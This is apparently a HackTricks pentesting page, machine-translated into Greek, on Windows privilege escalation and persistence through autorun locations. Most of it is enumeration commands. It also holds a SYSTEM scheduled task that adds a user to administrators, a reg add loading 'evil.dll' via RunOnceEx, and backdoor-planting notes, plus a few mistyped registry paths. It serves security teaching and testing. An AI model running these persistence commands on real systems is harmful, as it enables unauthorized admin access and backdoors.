# Privilege Escalation with Autoruns

{{#include ../../banners/hacktricks-training.md}}

## WMIC

**Wmic** μπορεί να χρησιμοποιηθεί για να εκτελεί προγράμματα κατά την **εκκίνηση**. Δείτε ποια binaries είναι προγραμματισμένα να εκτελούνται κατά την εκκίνηση με:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Προγραμματισμένα Καθήκοντα

**Καθήκοντα** μπορούν να προγραμματιστούν να εκτελούνται με **ορισμένη συχνότητα**. Δείτε ποια δυαδικά αρχεία είναι προγραμματισμένα να εκτελούνται με:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Φάκελοι

Όλα τα εκτελέσιμα αρχεία που βρίσκονται στους **φακέλους Εκκίνησης θα εκτελούνται κατά την εκκίνηση**. Οι κοινές φάκελοι εκκίνησης είναι αυτοί που αναφέρονται στη συνέχεια, αλλά ο φάκελος εκκίνησης υποδεικνύεται στο μητρώο. [Read this to learn where.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Registry

> [!NOTE]
> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Η καταχώρηση μητρώου **Wow6432Node** υποδεικνύει ότι εκτελείτε μια έκδοση Windows 64-bit. Το λειτουργικό σύστημα χρησιμοποιεί αυτό το κλειδί για να εμφανίσει μια ξεχωριστή προβολή του HKEY_LOCAL_MACHINE\SOFTWARE για εφαρμογές 32-bit που εκτελούνται σε εκδόσεις Windows 64-bit.

### Runs

**Γνωστό ως** AutoRun μητρώο:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Τα κλειδιά μητρώου που είναι γνωστά ως **Run** και **RunOnce** έχουν σχεδιαστεί για να εκτελούν αυτόματα προγράμματα κάθε φορά που ένας χρήστης συνδέεται στο σύστημα. Η γραμμή εντολών που ανατίθεται ως τιμή δεδομένων ενός κλειδιού περιορίζεται σε 260 χαρακτήρες ή λιγότερο.

**Service runs** (μπορεί να ελέγξει την αυτόματη εκκίνηση υπηρεσιών κατά την εκκίνηση):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Στα Windows Vista και σε μεταγενέστερες εκδόσεις, τα κλειδιά μητρώου **Run** και **RunOnce** δεν δημιουργούνται αυτόματα. Οι καταχωρήσεις σε αυτά τα κλειδιά μπορούν είτε να ξεκινούν άμεσα προγράμματα είτε να τα καθορίζουν ως εξαρτήσεις. Για παράδειγμα, για να φορτώσετε ένα αρχείο DLL κατά την είσοδο, μπορείτε να χρησιμοποιήσετε το κλειδί μητρώου **RunOnceEx** μαζί με ένα κλειδί "Depend". Αυτό αποδεικνύεται προσθέτοντας μια καταχώρηση μητρώου για να εκτελέσετε το "C:\temp\evil.dll" κατά την εκκίνηση του συστήματος:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!NOTE]
> **Εκμετάλλευση 1**: Αν μπορείτε να γράψετε μέσα σε οποιοδήποτε από τα αναφερόμενα μητρώα μέσα στο **HKLM**, μπορείτε να κλιμακώσετε τα δικαιώματα όταν συνδεθεί ένας διαφορετικός χρήστης.

> [!NOTE]
> **Εκμετάλλευση 2**: Αν μπορείτε να αντικαταστήσετε οποιοδήποτε από τα δυαδικά αρχεία που αναφέρονται σε οποιοδήποτε από τα μητρώα μέσα στο **HKLM**, μπορείτε να τροποποιήσετε αυτό το δυαδικό αρχείο με μια πίσω πόρτα όταν συνδεθεί ένας διαφορετικός χρήστης και να κλιμακώσετε τα δικαιώματα.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Οι συντομεύσεις που τοποθετούνται στον φάκελο **Startup** θα ενεργοποιούν αυτόματα υπηρεσίες ή εφαρμογές κατά τη διάρκεια της σύνδεσης του χρήστη ή της επανεκκίνησης του συστήματος. Η τοποθεσία του φακέλου **Startup** ορίζεται στο μητρώο για τους τομείς **Local Machine** και **Current User**. Αυτό σημαίνει ότι οποιαδήποτε συντόμευση προστεθεί σε αυτές τις καθορισμένες τοποθεσίες **Startup** θα διασφαλίσει ότι η συνδεδεμένη υπηρεσία ή πρόγραμμα θα ξεκινήσει μετά τη διαδικασία σύνδεσης ή επανεκκίνησης, καθιστώντας το μια απλή μέθοδο για τον προγραμματισμό προγραμμάτων να εκτελούνται αυτόματα.

> [!NOTE]
> Αν μπορείτε να αντικαταστήσετε οποιοδήποτε \[User] Shell Folder κάτω από **HKLM**, θα μπορείτε να το κατευθύνετε σε έναν φάκελο που ελέγχετε και να τοποθετήσετε μια backdoor που θα εκτελείται κάθε φορά που ένας χρήστης συνδέεται στο σύστημα, κλιμακώνοντας τα δικαιώματα.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Συνήθως, το **Userinit** κλειδί είναι ρυθμισμένο σε **userinit.exe**. Ωστόσο, αν αυτό το κλειδί τροποποιηθεί, το καθορισμένο εκτελέσιμο θα εκκινείται επίσης από το **Winlogon** κατά την είσοδο του χρήστη. Ομοίως, το **Shell** κλειδί προορίζεται να δείχνει στο **explorer.exe**, το οποίο είναι το προεπιλεγμένο shell για τα Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!NOTE]
> Αν μπορείτε να αντικαταστήσετε την τιμή μητρώου ή το δυαδικό αρχείο, θα μπορείτε να αναβαθμίσετε τα δικαιώματα.

### Ρυθμίσεις Πολιτικής

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Ελέγξτε το κλειδί **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Αλλαγή της Γραμμής Εντολών Ασφαλούς Λειτουργίας

Στο Μητρώο των Windows κάτω από `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, υπάρχει μια τιμή **`AlternateShell`** που είναι ρυθμισμένη από προεπιλογή σε `cmd.exe`. Αυτό σημαίνει ότι όταν επιλέγετε "Ασφαλής Λειτουργία με Γραμμή Εντολών" κατά την εκκίνηση (πατώντας F8), χρησιμοποιείται το `cmd.exe`. Ωστόσο, είναι δυνατόν να ρυθμίσετε τον υπολογιστή σας να ξεκινά αυτόματα σε αυτή τη λειτουργία χωρίς να χρειάζεται να πατήσετε F8 και να την επιλέξετε χειροκίνητα.

Βήματα για να δημιουργήσετε μια επιλογή εκκίνησης για αυτόματη εκκίνηση σε "Ασφαλή Λειτουργία με Γραμμή Εντολών":

1. Αλλάξτε τα χαρακτηριστικά του αρχείου `boot.ini` για να αφαιρέσετε τις σημαίες μόνο για ανάγνωση, συστήματος και κρυφές: `attrib c:\boot.ini -r -s -h`
2. Ανοίξτε το `boot.ini` για επεξεργασία.
3. Εισάγετε μια γραμμή όπως: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Αποθηκεύστε τις αλλαγές στο `boot.ini`.
5. Επαναφέρετε τα αρχικά χαρακτηριστικά του αρχείου: `attrib c:\boot.ini +r +s +h`

- **Εκμετάλλευση 1:** Η αλλαγή της κλειδώματος μητρώου **AlternateShell** επιτρέπει τη ρύθμιση προσαρμοσμένης γραμμής εντολών, ενδεχομένως για μη εξουσιοδοτημένη πρόσβαση.
- **Εκμετάλλευση 2 (Δικαιώματα Εγγραφής PATH):** Η ύπαρξη δικαιωμάτων εγγραφής σε οποιοδήποτε μέρος της μεταβλητής συστήματος **PATH**, ειδικά πριν από το `C:\Windows\system32`, σας επιτρέπει να εκτελέσετε ένα προσαρμοσμένο `cmd.exe`, το οποίο θα μπορούσε να είναι μια πίσω πόρτα αν το σύστημα ξεκινήσει σε Ασφαλή Λειτουργία.
- **Εκμετάλλευση 3 (Δικαιώματα Εγγραφής PATH και boot.ini):** Η πρόσβαση εγγραφής στο `boot.ini` επιτρέπει την αυτόματη εκκίνηση σε Ασφαλή Λειτουργία, διευκολύνοντας τη μη εξουσιοδοτημένη πρόσβαση κατά την επόμενη επανεκκίνηση.

Για να ελέγξετε την τρέχουσα ρύθμιση **AlternateShell**, χρησιμοποιήστε αυτές τις εντολές:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Εγκατεστημένο Συστατικό

Το Active Setup είναι μια δυνατότητα στα Windows που **ξεκινά πριν το περιβάλλον επιφάνειας εργασίας φορτωθεί πλήρως**. Δίνει προτεραιότητα στην εκτέλεση ορισμένων εντολών, οι οποίες πρέπει να ολοκληρωθούν πριν προχωρήσει η σύνδεση του χρήστη. Αυτή η διαδικασία συμβαίνει ακόμη και πριν ενεργοποιηθούν άλλες καταχωρίσεις εκκίνησης, όπως αυτές στις ενότητες μητρώου Run ή RunOnce.

Το Active Setup διαχειρίζεται μέσω των παρακάτω κλειδιών μητρώου:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Μέσα σε αυτά τα κλειδιά, υπάρχουν διάφορα υποκλειδιά, το καθένα από τα οποία αντιστοιχεί σε ένα συγκεκριμένο συστατικό. Οι τιμές κλειδιών που είναι ιδιαίτερα ενδιαφέρουσες περιλαμβάνουν:

- **IsInstalled:**
- `0` υποδεικνύει ότι η εντολή του συστατικού δεν θα εκτελεστεί.
- `1` σημαίνει ότι η εντολή θα εκτελεστεί μία φορά για κάθε χρήστη, που είναι η προεπιλεγμένη συμπεριφορά αν η τιμή `IsInstalled` λείπει.
- **StubPath:** Ορίζει την εντολή που θα εκτελείται από το Active Setup. Μπορεί να είναι οποιαδήποτε έγκυρη γραμμή εντολών, όπως η εκκίνηση του `notepad`.

**Ασφαλιστικές Γνώσεις:**

- Η τροποποίηση ή η εγγραφή σε ένα κλειδί όπου **`IsInstalled`** είναι ρυθμισμένο σε `"1"` με μια συγκεκριμένη **`StubPath`** μπορεί να οδηγήσει σε μη εξουσιοδοτημένη εκτέλεση εντολών, ενδεχομένως για κλιμάκωση προνομίων.
- Η τροποποίηση του δυαδικού αρχείου που αναφέρεται σε οποιαδήποτε τιμή **`StubPath`** θα μπορούσε επίσης να επιτύχει κλιμάκωση προνομίων, εφόσον υπάρχουν επαρκή δικαιώματα.

Για να ελέγξετε τις ρυθμίσεις **`StubPath`** σε διάφορα συστατικά του Active Setup, μπορούν να χρησιμοποιηθούν οι παρακάτω εντολές:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Overview of Browser Helper Objects (BHOs)

Τα Browser Helper Objects (BHOs) είναι DLL modules που προσθέτουν επιπλέον δυνατότητες στον Internet Explorer της Microsoft. Φορτώνονται στον Internet Explorer και τον Windows Explorer σε κάθε εκκίνηση. Ωστόσο, η εκτέλεσή τους μπορεί να αποκλειστεί ρυθμίζοντας το **NoExplorer** key σε 1, αποτρέποντας την φόρτωσή τους με τις περιπτώσεις του Windows Explorer.

Τα BHOs είναι συμβατά με τα Windows 10 μέσω του Internet Explorer 11 αλλά δεν υποστηρίζονται στον Microsoft Edge, τον προεπιλεγμένο περιηγητή σε νεότερες εκδόσεις των Windows.

Για να εξερευνήσετε τα BHOs που είναι καταχωρημένα σε ένα σύστημα, μπορείτε να ελέγξετε τα παρακάτω κλειδιά μητρώου:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Κάθε BHO εκπροσωπείται από το **CLSID** του στο μητρώο, που λειτουργεί ως μοναδικός αναγνωριστικός αριθμός. Λεπτομερείς πληροφορίες σχετικά με κάθε CLSID μπορούν να βρεθούν κάτω από `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Για την ερώτηση BHOs στο μητρώο, μπορούν να χρησιμοποιηθούν οι παρακάτω εντολές:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Επεκτάσεις Internet Explorer

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Σημειώστε ότι η μητρώο θα περιέχει 1 νέο κλειδί μητρώου για κάθε dll και θα εκπροσωπείται από το **CLSID**. Μπορείτε να βρείτε τις πληροφορίες CLSID στο `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Οδηγοί Γραμματοσειρών

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Ανοιχτή Εντολή

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Επιλογές Εκτέλεσης Αρχείων Εικόνας
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Σημειώστε ότι όλοι οι ιστότοποι όπου μπορείτε να βρείτε autoruns έχουν **ήδη ερευνηθεί από**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Ωστόσο, για μια **πιο ολοκληρωμένη λίστα με αυτόματα εκτελούμενα** αρχεία μπορείτε να χρησιμοποιήσετε [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)από τα sysinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Περισσότερα

**Βρείτε περισσότερα Autoruns όπως οι καταχωρήσεις στο** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## Αναφορές

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)



{{#include ../../banners/hacktricks-training.md}}
